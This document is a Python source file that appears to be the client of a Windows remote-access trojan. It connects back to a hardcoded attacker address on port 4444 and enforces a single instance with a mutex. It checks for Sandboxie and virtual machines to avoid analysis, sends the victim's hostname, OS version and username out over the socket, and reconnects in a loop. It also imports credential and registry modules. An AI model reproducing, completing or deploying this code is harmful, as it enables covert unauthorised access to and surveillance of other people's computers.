import sys, os, time, subprocess, socket, platform, ctypes, threading, wmi
import win32api, winerror, win32event, win32crypt
from winreg import *

strHost = "192.168.213.129"
intPort = 4444

strPath = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']

intbuff = 1024
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

def detectSandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return "(Sandboxie)"
    except:
        return ""

def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""

def server_connect():
    global objSocket

    while True:
        try:
            objSocket = socket.socket()
            objSocket.connect((strHost, intPort))
        except socket.error:
            time.sleep(5)
        else:
            break

    struserInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release() + detectSandboxie() + detectVM() + "'," + os.environ["USERNAME"]
    send(str.encode(struserInfo))

decode_utf8 = lambda data: data.decode("utf-8")
recv = lambda buffer: objSocket.recv(buffer)
send = lambda data: objSocket.send(data)

server_connect()

while True:
    try:
        while True:
            strData = recv(intbuff)
            strData = decode_utf8(strData)

            if strData == "exit":
                objSocket.close()
                sys.exit(0)
    except socket.error:
        objSocket.close()
        del objSocket
        
        server_connect()
